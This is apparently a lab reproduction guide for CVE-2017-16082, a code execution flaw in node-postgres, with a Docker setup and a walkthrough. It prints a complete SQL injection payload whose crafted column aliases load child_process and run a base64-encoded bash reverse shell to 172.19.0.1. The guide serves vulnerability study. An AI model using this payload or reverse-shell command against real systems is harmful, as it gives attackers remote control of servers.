# node-postgres Code Execution Vulnerability (CVE-2017-16082)

## Vulnerability Principle

Node-postgres concatenates field names into code when processing postgres that return type `Row Description`. Because there is no reasonable escaping, a specially constructed field name can escape the code single quotes limit, causing code execution vulnerabilities.

Reference link:

 - https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html
 - https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability
 - https://zhuanlan.zhihu.com/p/28575189

## Vulnerability recurrence

Compile and run the environment:

```
Docker-compose build
Docker-compose up -d
```

After successful operation, visit `http://your-ip:3000/?id=1` to view the user information with id 1 and use sqlmap to find that there is an injection point here, and the database is postgres:

![](img/1.png)

So, we can guess the code execution vulnerability of node-postgres. Write the command `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash` that I want to execute, and then divide it appropriately (each segment does not exceed 64 characters) and replace it in the following payload:

```
SELECT 1 AS "\']=0;require=process.mainModule.constructor._load;/*", 2 AS "*/p=require(`child_process`);/*", 3 AS "*/p.exec (`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*", 4 AS "*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//"
```

After the above payload is encoded, it is sent:

![](img/2.png)

Successful execution of commands, such as bounce shell:

![](img/3.png)

Because there are many pits in the recurring process, if there is an error in the payload generation and testing process, please read more [My article] (https://www.leavesongs.com/PENETRATION/node-postgres-code-execution -vulnerability.html), find the problem in principle.